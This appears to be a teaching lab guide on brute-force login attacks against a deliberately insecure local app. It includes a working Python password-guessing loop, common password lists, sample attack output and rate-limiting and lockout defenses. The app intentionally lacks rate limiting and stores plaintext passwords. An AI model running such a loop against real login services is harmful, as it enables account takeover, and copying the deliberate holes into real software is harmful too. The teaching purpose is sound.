# 🔓 Brute Force Attack Guide

## Overview

This guide explains brute force attacks and provides tools to demonstrate why rate limiting is critical.

---

## 📁 Files Included

1. **`brute_force_demo.py`** - Complete demonstration script
2. **`brute_force_exercise.py`** - Student exercise with TODOs
3. **`BRUTE_FORCE_GUIDE.md`** - This guide

---

## 🎯 What is a Brute Force Attack?

A **brute force attack** is when an attacker tries many passwords until one works.

### How It Works

```
For each password in password_list:
    Try to login with password
    If login succeeds:
        Password found!
        Stop
    If login fails:
        Try next password
```

### Why It's Dangerous

- **Simple**: Easy to implement
- **Effective**: Will eventually find the password
- **Automated**: Can try millions of passwords
- **Common**: Used in 80% of account takeovers

---

## 🚀 Quick Start

### Option 1: Run Complete Demo

```bash
# Install dependencies
pip install requests

# Run the complete demo
python brute_force_demo.py
```

### Option 2: Complete Student Exercise

```bash
# Open the exercise file
# Complete the TODOs
python brute_force_exercise.py
```

---

## 🔴 Demo Script (`brute_force_demo.py`)

### Features

- ✅ Automatic brute force attack
- ✅ Color-coded output
- ✅ Progress tracking
- ✅ Performance metrics
- ✅ Attack calculations
- ✅ Mitigation suggestions

### Usage

```bash
python brute_force_demo.py
```

**Important**: Update `TARGET_EMAIL` in the script to match your test user!

### What It Does

1. **Demonstrates vulnerability**: Shows Phase 1 has no rate limiting
2. **Tries passwords**: Attempts login with common passwords
3. **Finds password**: Discovers the correct password
4. **Shows metrics**: Displays speed and success rate
5. **Explains fixes**: Suggests Phase 2 improvements

### Sample Output

```
======================================================================
🔓 BRUTE FORCE ATTACK DEMONSTRATION
======================================================================
⚠️  EDUCATIONAL PURPOSE ONLY
Target: http://localhost:3000/api/auth/login
Email: student@test.com
Passwords to try: 31
======================================================================

Starting brute force attack...

[1/31] ✗ Testing: '123456' (45ms) - Invalid credentials
[2/31] ✗ Testing: 'password' (42ms) - Invalid credentials
[3/31] ✗ Testing: '12345678' (43ms) - Invalid credentials
...
[20/31] ✓ Testing: 'TestPassword123' (48ms) - Login successful

======================================================================
🎯 PASSWORD FOUND!
======================================================================
Password: TestPassword123
Attempts: 20/31
Time taken: 1.2 seconds
```

---

## 📝 Student Exercise (`brute_force_exercise.py`)

### Learning Objectives

Students will:
1. Implement HTTP requests in Python
2. Create a brute force attack loop
3. Measure attack performance
4. Understand why rate limiting is needed

### Exercise Structure

```python
# TODO 1: Implement login attempt
def attempt_login(email, password):
    # Make POST request
    # Return True/False

# TODO 2: Implement brute force loop
def brute_force_attack(email, password_list):
    # Try each password
    # Return successful password

# TODO 3: Measure attack speed
def measure_attack_speed(email, password_list):
    # Time the attack
    # Calculate metrics

# TODO 4: Call your functions
def main():
    # Execute attack
    # Print results
```

### Hints Provided

Each TODO includes:
- Clear instructions
- Helpful hints
- Function signatures
- Expected behavior

### Solution Approach

**TODO 1: attempt_login()**
```python
def attempt_login(email: str, password: str):
    try:
        response = requests.post(
            API_URL,
            json={"email": email, "password": password},
            timeout=10
        )
        return response.status_code == 200
    except:
        return False
```

**TODO 2: brute_force_attack()**
```python
def brute_force_attack(email: str, password_list: list):
    for i, password in enumerate(password_list, 1):
        print(f"[{i}/{len(password_list)}] Trying: {password}")
        
        if attempt_login(email, password):
            print(f"✓ Password found: {password}")
            return password
    
    return None
```

**TODO 3: measure_attack_speed()**
```python
def measure_attack_speed(email: str, password_list: list):
    start = time.time()
    password = brute_force_attack(email, password_list)
    end = time.time()
    
    elapsed = end - start
    attempts = len(password_list)
    rate = attempts / elapsed
    
    print(f"\nTime: {elapsed:.2f}s")
    print(f"Attempts: {attempts}")
    print(f"Rate: {rate:.2f} attempts/sec")
    
    return password
```

### Bonus Challenges

Advanced students can attempt:

1. **Add delays**: Implement delay between attempts
2. **Save results**: Export to CSV file
3. **Detect rate limiting**: Handle 429 status codes
4. **Large password lists**: Test with 100+ passwords

---

## 🧪 Testing Scenarios

### Scenario 1: Small List (Quick Test)

```python
PASSWORDS = ["password", "123456", "TestPassword123"]
# Expected: ~0.5 seconds, 3 attempts
```

### Scenario 2: Common Passwords

```python
PASSWORDS = [
    "123456", "password", "12345678", "qwerty",
    "123456789", "12345", "1234", "111111"
]
# Expected: ~1-2 seconds, 8 attempts
```

### Scenario 3: Large Dictionary

```python
# Load from file: passwords.txt (100 entries)
# Expected: ~10-20 seconds, 100 attempts
```

---

## 📊 Attack Calculations

### Real-World Scenarios

| Password List Size | Time @ 10/sec | Time @ 100/sec | Time @ 1000/sec |
|-------------------|---------------|----------------|-----------------|
| 100 | 10 sec | 1 sec | 0.1 sec |
| 1,000 | 1.7 min | 10 sec | 1 sec |
| 10,000 | 16.7 min | 1.7 min | 10 sec |
| 100,000 | 2.8 hours | 16.7 min | 1.7 min |
| 1,000,000 | 27.8 hours | 2.8 hours | 16.7 min |
| 10,000,000 | 11.6 days | 27.8 hours | 2.8 hours |

**Insight**: Even at slow speeds (10/sec), attackers can try thousands of passwords in minutes!

---

## 🛡️ Defense Strategies

### Phase 2 Will Implement:

#### 1. Rate Limiting
```javascript
// express-rate-limit
const limiter = rateLimit({
  windowMs: 15 * 60 * 1000, // 15 minutes
  max: 5, // 5 attempts
  message: "Too many login attempts"
});

app.post('/login', limiter, loginHandler);
```

#### 2. Account Lockout
```javascript
// After 5 failed attempts
if (failedAttempts >= 5) {
  lockAccount(email, 30 * 60 * 1000); // 30 min
  return res.status(423).json({ 
    error: "Account locked" 
  });
}
```

#### 3. Progressive Delays
```javascript
// Increase delay after each failure
const delay = Math.min(
  2 ** failedAttempts * 1000, 
  30000
);
await sleep(delay);
```

#### 4. CAPTCHA
```javascript
// After 3 failed attempts
if (failedAttempts >= 3) {
  requireCaptcha = true;
}
```

---

## 🎓 Discussion Questions

### For Students

1. **How long did the attack take?**
   - Measure actual time
   - Calculate attempts per second

2. **How many passwords could you try in 1 hour?**
   - Use your measured rate
   - Calculate: rate × 3600 seconds

3. **Why does this attack work in Phase 1?**
   - No rate limiting
   - No account lockout
   - Fast responses
   - No CAPTCHA

4. **How would rate limiting stop this?**
   - Limits attempts to 5 per 15 min
   - Would take 100 hours for 2000 passwords
   - Makes attack impractical

5. **What else could prevent brute force?**
   - Strong password requirements
   - Two-factor authentication
   - Breach detection
   - IP blocking

### For Instructors

**Lab Discussion Topics:**

1. **Ethics of brute force attacks**
   - Legal implications
   - When is it allowed?
   - Responsible disclosure

2. **Defense in depth**
   - Multiple layers of security
   - Don't rely on one defense

3. **User education**
   - Importance of strong passwords
   - Password managers
   - Avoiding common passwords

---

## ⚠️ Important Notes

### Legal & Ethical Use

✅ **Allowed:**
- Testing your own Phase 1 application
- Educational lab environments
- With explicit written permission

❌ **Illegal:**
- Testing without authorization
- Accessing accounts you don't own
- Unauthorized penetration testing

### Consequences

Unauthorized brute force attacks can result in:
- **Criminal charges**: Computer Fraud and Abuse Act (US)
- **Jail time**: Up to 20 years for serious cases
- **Fines**: Hundreds of thousands of dollars
- **Civil lawsuits**: Damages claims
- **Academic**: Expulsion from school
- **Career**: Permanent record

**Always practice ethical hacking!**

---

## 🔍 Technical Details

### Why No Rate Limiting in Phase 1?

**Purpose**: Demonstrate vulnerability

**Reality**: Phase 1 intentionally omits security to:
1. Show how attacks work
2. Understand the risk
3. Motivate proper security
4. Practice exploitation techniques

### Attack Success Factors

1. **No delays**: Server responds immediately
2. **No lockout**: Unlimited attempts allowed
3. **Predictable**: Same response every time
4. **Fast network**: Local testing is very fast
5. **Simple auth**: Just email/password

---

## 📚 Additional Resources

### Tools

- **Hydra**: Popular brute force tool
- **Medusa**: Parallel brute forcer
- **Burp Suite**: Web app testing
- **John the Ripper**: Password cracker

### Learning

- **OWASP**: Brute force attacks guide
- **HackerOne**: Bug bounty platform
- **TryHackMe**: Hands-on security training
- **PortSwigger Academy**: Web security courses

### Password Lists

- **SecLists**: Comprehensive password lists
- **RockYou**: 14M real passwords from breach
- **Common-Passwords**: Top 1M passwords

---

## ✅ Completion Checklist

### Students Should:

- [ ] Understand what brute force attacks are
- [ ] Complete all TODOs in exercise file
- [ ] Run successful attack demonstration
- [ ] Measure attack speed and calculate metrics
- [ ] Answer discussion questions
- [ ] Explain why rate limiting is needed
- [ ] Propose other defense mechanisms

### Instructors Can:

- [ ] Demonstrate attack in class
- [ ] Show Prisma Studio with plaintext passwords
- [ ] Compare with/without rate limiting
- [ ] Discuss real-world incidents
- [ ] Preview Phase 2 security implementations

---

## 🎯 Summary

**Key Takeaways:**

1. ✅ Brute force attacks are **simple but effective**
2. ✅ Without rate limiting, attacks are **very fast**
3. ✅ Phase 1 is **intentionally vulnerable**
4. ✅ Rate limiting makes attacks **impractical**
5. ✅ Defense requires **multiple security layers**
6. ✅ Always practice **ethical hacking**

**Next Steps:**
- Complete the student exercise
- Run the demo script
- Answer discussion questions
- Plan Phase 2 security implementation
- Review other attack vectors

---

**Happy (ethical) hacking! 🎓🔒**

